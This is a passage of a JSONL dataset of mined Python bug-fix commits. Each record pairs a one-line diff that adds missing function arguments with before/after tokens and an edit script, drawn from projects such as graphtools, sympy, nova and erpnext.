{"project": "graphtools", "commit_sha": "c81bb669706bdff77e8460b28a5ef282f712c6c5", "parent_sha": "bbe0019dfd3a39586d56887d2f645d13d8a0b1d6", "file_path": "test/test_mnn.py", "project_url": "https://github.com/KrishnaswamyLab/graphtools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ def test_mnn_graph_error():\n \n def test_verbose():\n     X, sample_idx = generate_swiss_roll()\n-    build_graph(X, sample_idx=sample_idx, verbose=True)\n+    build_graph(X, sample_idx=sample_idx, n_pca=None, verbose=True)\n \n \n if __name__ == \"__main__\":\n", "before": "build_graph ( X , sample_idx = sample_idx , verbose = True )", "after": "build_graph ( X , sample_idx = sample_idx , n_pca = None , verbose = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 16, 3, 56], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", [\"argument_list\", 3, 16, 3, 56], [\",:,\", \"T\"], 6], [\"Insert\", \"N0\", [\"identifier:n_pca\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"none:None\", \"T\"], 2]]"}
{"project": "pyramid_apispec", "commit_sha": "085354a2a1acc6c389940d1261f0ae50a464065f", "parent_sha": "03e40ca9d7e0ab66241c174ffbfb15ea35688891", "file_path": "pyramid_apispec/views.py", "project_url": "https://github.com/ergo/pyramid_apispec", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -84,5 +84,5 @@ def swagger_ui_script_template(request, spec_route_name, **kwargs):\n         \"pyramid_apispec\", \"static/index_script_template.html\"\n     ).decode(\"utf8\")\n     return Template(template).safe_substitute(\n-        swagger_spec_url=request.route_url(spec_route_name)\n+        swagger_spec_url=request.route_url(spec_route_name, **request.matchdict)\n     )\n", "before": "return Template ( template ) . safe_substitute ( swagger_spec_url = request . route_url ( spec_route_name ) )", "after": "return Template ( template ) . safe_substitute ( swagger_spec_url = request . route_url ( spec_route_name , ** request . matchdict ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 43, 3, 60], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 43, 3, 60], [\"dictionary_splat\", \"N0\"], 3], [\"Insert\", \"N0\", [\"**:**\", \"T\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 1], [\"Insert\", \"N1\", [\"identifier:request\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:matchdict\", \"T\"], 2]]"}
{"project": "graphtools", "commit_sha": "f2ae6aa62e433b91f10c4b60d98a86844db01029", "parent_sha": "b541ff038f8e26193b12f2f7adf32a4d0e04e7cc", "file_path": "test/test_knn.py", "project_url": "https://github.com/KrishnaswamyLab/graphtools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -333,7 +333,7 @@ def test_shortest_path():\n def test_shortest_path_decay():\n     data_small = data[np.random.choice(\n         len(data), len(data) // 4, replace=False)]\n-    G = build_graph(data_small, knn=5, decay=15)\n+    G = build_graph(data_small, knn=5, decay=15, thresh=1e-4)\n     G.shortest_path()\n \n \n", "before": "G = build_graph ( data_small , knn = 5 , decay = 15 )", "after": "G = build_graph ( data_small , knn = 5 , decay = 15 , thresh = 1e-4 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 20, 3, 49], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 20, 3, 49], [\"keyword_argument\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:thresh\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"float:1e-4\", \"T\"], 2]]"}
{"project": "cb4", "commit_sha": "9cbc0afb83f9fc850763fb78cc88a79ab3fb3688", "parent_sha": "0c4b1f89ad488253b593d86454c84884d2ca8151", "file_path": "vj4/util/locale.py", "project_url": "https://github.com/joint-online-judge/cb4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def load_translations(translation_path):\n   for path in os.listdir(translation_path):\n     if not path.endswith(\".csv\"):\n       continue\n-    with open(os.path.join(translation_path, path)) as csv_file:\n+    with open(os.path.join(translation_path, path), encoding='utf-8') as csv_file:\n       _locales[path[:-4]] = dict(csv.reader(csv_file))\n \n \n", "before": "with open ( os . path . join ( translation_path , path ) ) as csv_file : _locales [ path [ : - 4 ] ] = dict ( csv . reader ( csv_file ) )", "after": "with open ( os . path . join ( translation_path , path ) , encoding = 'utf-8' ) as csv_file : _locales [ path [ : - 4 ] ] = dict ( csv . reader ( csv_file ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 14, 3, 52], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 14, 3, 52], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:encoding\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'utf-8'\", \"T\"], 2]]"}
{"project": "cb4", "commit_sha": "700c0e971e0ed9a68925656df3ed46cd2b1a4e03", "parent_sha": "b6c427eaa7f62700e87b1ee5cec91ecae1e843d2", "file_path": "vj4/handler/base.py", "project_url": "https://github.com/joint-online-judge/cb4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class HandlerBase(setting.SettingMixin):\n     mask = self.domain['roles'].get(role, builtin.PERM_NONE)\n     return ((perm & mask) == perm\n             or self.domain['owner_uid'] == udoc['_id']\n-            or self.udoc_has_priv(builtin.PRIV_ALL))\n+            or self.udoc_has_priv(udoc, builtin.PRIV_ALL))\n \n   def udoc_has_priv(self, udoc, priv):\n     return (priv & udoc['priv']) == priv\n", "before": "return ( ( perm & mask ) == perm or self . domain [ 'owner_uid' ] == udoc [ '_id' ] or self . udoc_has_priv ( builtin . PRIV_ALL ) )", "after": "return ( ( perm & mask ) == perm or self . domain [ 'owner_uid' ] == udoc [ '_id' ] or self . udoc_has_priv ( udoc , builtin . PRIV_ALL ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 52], [\"identifier:udoc\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 34, 3, 52], [\",:,\", \"T\"], 2]]"}
{"project": "simp_le", "commit_sha": "b4019eca832230ac48d74577f35faa02bc4780a0", "parent_sha": "a07bd1f057b1e7e72ef89311da4790c2f97a5ec8", "file_path": "simp_le.py", "project_url": "https://github.com/pradeepchhetri/simp_le", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -792,7 +792,7 @@ def _new_data(args):\n             logger.warning('%s was not succesfully verified by the '\n                            'client. CA is likely to fail as well!', name)\n         else:\n-            logger.info('%s was succesfully verified by the client')\n+            logger.info('%s was succesfully verified by the client', name)\n \n         client.answer_challenge(challb, response)\n \n", "before": "else : logger . info ( '%s was succesfully verified by the client' )", "after": "else : logger . info ( '%s was succesfully verified by the client' , name )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 24, 3, 69], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 24, 3, 69], [\"identifier:name\", \"T\"], 3]]"}
{"project": "sympy", "commit_sha": "d5fe2954615afb9fa87175b7f663cc51bd8f5d46", "parent_sha": "59414a7cba1401c5268c335c4e6ce71d5e0bcb7b", "file_path": "sympy/core/tests/test_args.py", "project_url": "https://github.com/grannydatasoup/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3676,4 +3676,4 @@ def test_sympy__vector__scalar__BaseScalar():\n \n def test_sympy__physics__wigner__Wigner3j():\n     from sympy.physics.wigner import Wigner3j\n-    assert _test_args(Wigner3j(0,0,0,0))\n+    assert _test_args(Wigner3j(0,0,0,0,0,0))\n", "before": "assert _test_args ( Wigner3j ( 0 , 0 , 0 , 0 ) )", "after": "assert _test_args ( Wigner3j ( 0 , 0 , 0 , 0 , 0 , 0 ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 40], [\",:,\", \"T\"], 8], [\"Insert\", [\"argument_list\", 3, 31, 3, 40], [\"integer:0\", \"T\"], 9], [\"Insert\", [\"argument_list\", 3, 31, 3, 40], [\",:,\", \"T\"], 10], [\"Insert\", [\"argument_list\", 3, 31, 3, 40], [\"integer:0\", \"T\"], 11]]"}
{"project": "depot_tools", "commit_sha": "c2bc22d69dcfc9dcc9c3d82b6a9d807df206b06d", "parent_sha": "d9eb69edcaa5a366573f9e714db71e810a06b51b", "file_path": "git_cache.py", "project_url": "https://github.com/Neozaru/depot_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -252,7 +252,7 @@ class Mirror(object):\n       python_fallback = True\n \n     gs_folder = 'gs://%s/%s' % (self.bootstrap_bucket, self.basedir)\n-    gsutil = Gsutil(self.gsutil_exe, bypass_prodaccess=True)\n+    gsutil = Gsutil(self.gsutil_exe, boto_path=None, bypass_prodaccess=True)\n     # Get the most recent version of the zipfile.\n     _, ls_out, _ = gsutil.check_call('ls', gs_folder)\n     ls_out_sorted = sorted(ls_out.splitlines())\n", "before": "gsutil = Gsutil ( self . gsutil_exe , bypass_prodaccess = True )", "after": "gsutil = Gsutil ( self . gsutil_exe , boto_path = None , bypass_prodaccess = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 20, 3, 61], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 20, 3, 61], [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:boto_path\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"none:None\", \"T\"], 2]]"}
{"project": "project-411", "commit_sha": "1f0134999e70c4aec18bad5f91eda36e305be6a5", "parent_sha": "1c4b399c2ba60df1d25db66e3efd2a2ad25b9fa7", "file_path": "app/events.py", "project_url": "https://github.com/nikitabelonogov/project-411", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,4 +14,4 @@ def handle_message(message):\n def handle_message(message):\n     print('received message: ' + str(message))\n     if len(message) is not 0:\n-        emit('message', response())\n+        emit('message', response(message))\n", "before": "emit ( 'message' , response ( ) )", "after": "emit ( 'message' , response ( message ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\"identifier:message\", \"T\"], 1]]"}
{"project": "DistAlgo", "commit_sha": "86bad00571945ad0ff0bc1e1be15d0e52437f87c", "parent_sha": "d9c966f13e34258509e68965bcec894680534164", "file_path": "da/sim.py", "project_url": "https://github.com/mayli/DistAlgo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -224,7 +224,7 @@ class DistProcess(multiprocessing.Process):\n     def spawn(self, pcls, args):\n         \"\"\"Spawns a child process\"\"\"\n         childp, ownp = multiprocessing.Pipe()\n-        p = pcls(self._id, childp, self._channel)\n+        p = pcls(self._id, childp, self._channel, self._cmdline)\n         p.daemon = True\n         p.start()\n \n", "before": "p = pcls ( self . _id , childp , self . _channel )", "after": "p = pcls ( self . _id , childp , self . _channel , self . _cmdline )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 17, 3, 50], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 17, 3, 50], [\"attribute\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:_cmdline\", \"T\"], 2]]"}
{"project": "puppetboard", "commit_sha": "64c26e19c2dfd44be7f37f9e6dd8d6cf7972ea0f", "parent_sha": "2f347fd665033c6faaa4e4026188273593d6172d", "file_path": "puppetboard/app.py", "project_url": "https://github.com/mterzo/puppetboard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -467,7 +467,7 @@ def reports_ajax(env, node_name):\n     order_column = int(request.args.get('order[0][column]', 0))\n     order_filter = REPORTS_COLUMNS[order_column].get(\n         'filter', REPORTS_COLUMNS[order_column]['attr'])\n-    order_dir = request.args.get('order[0][dir]')\n+    order_dir = request.args.get('order[0][dir]', 'desc')\n     order_args = '[{\"field\": \"%s\", \"order\": \"%s\"}]' % (order_filter, order_dir)\n     status_args = request.args.get('columns[1][search][value]', '').split('|')\n     max_col = len(REPORTS_COLUMNS)\n", "before": "order_dir = request . args . get ( 'order[0][dir]' )", "after": "order_dir = request . args . get ( 'order[0][dir]' , 'desc' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 50], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 33, 3, 50], [\"string:'desc'\", \"T\"], 3]]"}
{"project": "augur", "commit_sha": "6f4dd0dc3b48ba19c9da5c048e73f1a48ed01255", "parent_sha": "05ab671b7eb099cc9a3a07c4f7f665d3de99442e", "file_path": "event.py", "project_url": "https://github.com/brennonbrimhall/augur", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ class Event:\n \t\t\t\tself.findTeam(teams, self.matches[i].getBlue2()).win()\r\n \t\t\t\tself.findTeam(teams, self.matches[i].getBlue3()).win()\r\n \t\t\tcurrentNumber = currentNumber / 2\r\n-\t\tteams.sort()\r\n+\t\tteams.sort(reverse=True)\r\n \t\tself.updateSummary(teams, probability)\r\n \r\n \tdef updateSummary(self, teams, probability):\r\n", "before": "teams . sort ( )", "after": "teams . sort ( reverse = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 13, 3, 15], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:reverse\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "google-cluster-prediction", "commit_sha": "f5f2be0d04e63ab6e89a6002f9abe06912510c9e", "parent_sha": "a00f03e0fdc7f57e2910796b8059e926520a2afc", "file_path": "bin/task_usage_learn.py", "project_url": "https://github.com/learning-on-chip/google-cluster-prediction", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -258,7 +258,7 @@ class Model:\n             initializer=config.regression_initializer)\n         b = tf.get_variable('b', [1, config.dimension_count])\n         y_hat = tf.matmul(x, w) + tf.tile(b, [unroll_count, 1])\n-        loss = tf.reduce_mean(tf.squared_difference(y_hat, y))\n+        loss = tf.reduce_mean(tf.squared_difference(y_hat, y), axis=0)\n         return y_hat, loss\n \n \n", "before": "loss = tf . reduce_mean ( tf . squared_difference ( y_hat , y ) )", "after": "loss = tf . reduce_mean ( tf . squared_difference ( y_hat , y ) , axis = 0 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 63], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 30, 3, 63], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:axis\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2]]"}
{"project": "dedupe", "commit_sha": "8c83d498a2875187189a4427ba61732d48f8c6f1", "parent_sha": "58b954b371944ae89e485e52a5088bf11fa0f888", "file_path": "dedupe/serializer.py", "project_url": "https://github.com/c-rap/dedupe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ class dedupe_encoder(json.JSONEncoder):\n             python_object = {'__class__': 'tuple',\n                     '__value__': list(python_object)}\n         \n-        return json.JSONEncoder.encode(python_object)\n+        return json.JSONEncoder.encode(self, python_object)\n \n class dedupe_decoder(json.JSONDecoder):\n \n", "before": "return json . JSONEncoder . encode ( python_object )", "after": "return json . JSONEncoder . encode ( self , python_object )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 39, 3, 54], [\"identifier:self\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 39, 3, 54], [\",:,\", \"T\"], 2]]"}
{"project": "nova", "commit_sha": "48aa5f2bafee04cfc07501dd54667f4c9a184da2", "parent_sha": "7b35aa97d84acaa503083a85c96bdf90a4aabe05", "file_path": "nova/service.py", "project_url": "https://github.com/minditech/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -393,7 +393,7 @@ class WSGIService(service.Service):\n \n \n def process_launcher():\n-    return service.ProcessLauncher(CONF)\n+    return service.ProcessLauncher(CONF, restart_method='mutate')\n \n \n # NOTE(vish): the global launcher is to maintain the existing\n", "before": "return service . ProcessLauncher ( CONF )", "after": "return service . ProcessLauncher ( CONF , restart_method = 'mutate' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 41], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 35, 3, 41], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:restart_method\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'mutate'\", \"T\"], 2]]"}
{"project": "charm-percona-cluster", "commit_sha": "0b34272a74f0bb5c4caa82c5d525015fbcd7285a", "parent_sha": "36144e63e9937777fecf5ee6296d2d5c93f592ef", "file_path": "hooks/percona_hooks.py", "project_url": "https://github.com/CanonicalBootStack/charm-percona-cluster", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -153,7 +153,7 @@ def shared_db_changed(relation_id=None):\n         relation_clear(relation_id)\n         return\n \n-    settings = relation_get()\n+    settings = relation_get(rid=relation_id)\n     if is_clustered():\n         db_host = config('vip')\n     else:\n", "before": "settings = relation_get ( )", "after": "settings = relation_get ( rid = relation_id )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 30], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:rid\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:relation_id\", \"T\"], 2]]"}
{"project": "MuGo", "commit_sha": "1bd0c84b6924e17ab539a2901447f1313e52e8a3", "parent_sha": "91e3d14779c62a775c751c0b576e11d42682a726", "file_path": "go.py", "project_url": "https://github.com/OpneSourceAnalysisJourney/MuGo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ class Position(namedtuple('Position', 'board n komi caps groups ko last last2 pl\n     @staticmethod\n     def initial_state():\n-        return Position(EMPTY_BOARD, n=0, komi=7.5, caps=(0, 0), groups=(set(), set()), ko=None, last=None, last2=None)\n+        return Position(EMPTY_BOARD, n=0, komi=7.5, caps=(0, 0), groups=(set(), set()), ko=None, last=None, last2=None, player1turn=True)\n \n     def possible_moves(self):\n         return [c for c in ALL_COORDS if self.board[c] == '.' and not is_likely_eye(self.board, c)]\n", "before": "return Position ( EMPTY_BOARD , n = 0 , komi = 7.5 , caps = ( 0 , 0 ) , groups = ( set ( ) , set ( ) ) , ko = None , last = None , last2 = None )", "after": "return Position ( EMPTY_BOARD , n = 0 , komi = 7.5 , caps = ( 0 , 0 ) , groups = ( set ( ) , set ( ) ) , ko = None , last = None , last2 = None , player1turn = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 24, 2, 120], [\",:,\", \"T\"], 16], [\"Insert\", [\"argument_list\", 2, 24, 2, 120], [\"keyword_argument\", \"N0\"], 17], [\"Insert\", \"N0\", [\"identifier:player1turn\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "MuGo", "commit_sha": "2cfb8705ce7c87baa5e4314ce26797d0ebbcfa3e", "parent_sha": "7203988fa4a513f8b34f4be84cf72a71daac4d45", "file_path": "go.py", "project_url": "https://github.com/OpneSourceAnalysisJourney/MuGo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ class LibertyTracker():\n \n         lib_tracker.max_group_id = curr_group_id\n \n-        liberty_counts = np.zeros([N, N])\n+        liberty_counts = np.zeros([N, N], dtype=np.uint8)\n         for group in lib_tracker.groups.values():\n             num_libs = len(group.liberties)\n             for s in group.stones:\n", "before": "liberty_counts = np . zeros ( [ N , N ] )", "after": "liberty_counts = np . zeros ( [ N , N ] , dtype = np . uint8 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 42], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 34, 3, 42], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:dtype\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:np\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:uint8\", \"T\"], 2]]"}
{"project": "erpnext-v7", "commit_sha": "f817672bb6cdb200ac1e3037b9e9df54f4ceca84", "parent_sha": "1ae89948e5a4164f564e40d5e474020aa9bfe371", "file_path": "utilities/doctype/sms_control/sms_control.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class DocType:\n \tdef connect_gateway(self):\n \t\t\"login to gateway\"\n \t\tfrom webnotes.utils.webservice import FrameworkServer\n-\t\tfw = FrameworkServer('www.erpnext.com', '/', '__system@webnotestech.com', 'password')\n+\t\tfw = FrameworkServer('www.erpnext.com', '/', '__system@webnotestech.com', 'password', https=1)\n \t\treturn fw\n \n \tdef get_sender_name(self):\n", "before": "fw = FrameworkServer ( 'www.erpnext.com' , '/' , '__system@webnotestech.com' , 'password' )", "after": "fw = FrameworkServer ( 'www.erpnext.com' , '/' , '__system@webnotestech.com' , 'password' , https = 1 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 23, 3, 88], [\",:,\", \"T\"], 8], [\"Insert\", [\"argument_list\", 3, 23, 3, 88], [\"keyword_argument\", \"N0\"], 9], [\"Insert\", \"N0\", [\"identifier:https\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:1\", \"T\"], 2]]"}
{"project": "erpnext-v7", "commit_sha": "7c285712e100a845389af83e8b21e9b419689c60", "parent_sha": "f88f2f4d139fcfdea58ea45fe1e981b812933ff3", "file_path": "accounts/doctype/period_closing_voucher/period_closing_voucher.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ class DocType:\n \n     # save\n     le.save(1)\n-    le_obj.on_update(adv_adj = '')\n+    le_obj.on_update(adv_adj = '', cancel = '')\n     \n \n   # Reposting Balances\n", "before": "le_obj . on_update ( adv_adj = '' )", "after": "le_obj . on_update ( adv_adj = '' , cancel = '' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 35], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 21, 3, 35], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:cancel\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:''\", \"T\"], 2]]"}
{"project": "erpnext-v7", "commit_sha": "510dad7aa7a8503fef008bdd6237bb9121d3c62a", "parent_sha": "25ffe5b9a4e411d3eed5a741e422188de902e8b4", "file_path": "accounts/doctype/period_closing_voucher/period_closing_voucher.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ class DocType:\n \n     # save\n     le.save(1)\n-    le_obj.on_update(adv_adj = '')\n+    le_obj.on_update(adv_adj = '', cancel = '')\n     \n \n   # Reposting Balances\n", "before": "le_obj . on_update ( adv_adj = '' )", "after": "le_obj . on_update ( adv_adj = '' , cancel = '' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 35], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 21, 3, 35], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:cancel\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:''\", \"T\"], 2]]"}
{"project": "erpnext-v7", "commit_sha": "8e0f15a8b1271274432135ae3b06a60344d9ecb8", "parent_sha": "1d5cab87452567499410c5598faf97cc8e86c4da", "file_path": "stock/doctype/warehouse/warehouse.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ class DocType:\n     bl = sql(\"select name from tabBin where warehouse=%s\", self.doc.name)\n     for b in bl:\n       bobj = get_obj('Bin',b[0])\n-      bobj.update_item_valuation()\n+      bobj.update_item_valuation(posting_date = '2000-01-01', posting_time = '12:00')\n \n       sql(\"COMMIT\")\n       sql(\"START TRANSACTION\")\n", "before": "bobj . update_item_valuation ( )", "after": "bobj . update_item_valuation ( posting_date = '2000-01-01' , posting_time = '12:00' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 33, 3, 35], [\"keyword_argument\", \"N1\"], 3], [\"Insert\", \"N0\", [\"identifier:posting_date\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'2000-01-01'\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:posting_time\", \"T\"], 0], [\"Insert\", \"N1\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'12:00'\", \"T\"], 2]]"}
{"project": "xos-1", "commit_sha": "a33af70b9d8db318194f327370ab8725f9808105", "parent_sha": "057a6a14f4167c16e29e69d43e5177566373ca7d", "file_path": "xos/tosca/resources/servicecontroller.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class XOSServiceController(XOSResource):\n                     parts=value.split()\n                     for part in parts[:-1]:\n                        if \":\" in part:\n-                           (lhs, rhs) = part.split(1)\n+                           (lhs, rhs) = part.split(\":\", 1)\n                            if lhs==\"subdirectory\":\n                                subdirectory=rhs\n                            else:\n", "before": "( lhs , rhs ) = part . split ( 1 )", "after": "( lhs , rhs ) = part . split ( \":\" , 1 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 51, 3, 54], [\"string:\\\":\\\"\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 51, 3, 54], [\",:,\", \"T\"], 2]]"}
{"project": "sar-pre-processing", "commit_sha": "2b8afab066afad51e957ce39d5d2ffdbbdcb6583", "parent_sha": "77ed18c1af0a212587e534d2713269569e04be06", "file_path": "sar_pre_processing/sar_pre_processor.py", "project_url": "https://github.com/multiply-org/sar-pre-processing", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -192,7 +192,7 @@ class SARPreProcessor(PreProcessor):\n             logging.info('normalisation angle not specified, default value of 35 is used for processing')\n         for file in self.file_list[0]:\n             logging.info('Scene ', self.file_list[0].index(file) + 1, ' of ', len(self.file_list[0]))\n-            self._gpt_step1(file, area, normalisation_angle)\n+            self._gpt_step1(file, None, area, normalisation_angle, self.config.xml_graph_pre_process_step1)\n         for i, file in enumerate(self.file_list[1][::2]):\n             file_list2 = self.file_list[1][1::2]\n             file2 = file_list2[i]\n", "before": "self . _gpt_step1 ( file , area , normalisation_angle )", "after": "self . _gpt_step1 ( file , None , area , normalisation_angle , self . config . xml_graph_pre_process_step1 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Move\", [\"identifier:area\", 3, 35, 3, 39], [\"argument_list\", 3, 28, 3, 61], 4], [\"Insert\", [\"argument_list\", 3, 28, 3, 61], [\"none:None\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 28, 3, 61], [\",:,\", \"T\"], 5], [\"Insert\", [\"argument_list\", 3, 28, 3, 61], [\",:,\", \"T\"], 9], [\"Insert\", [\"argument_list\", 3, 28, 3, 61], [\"attribute\", \"N0\"], 10], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", 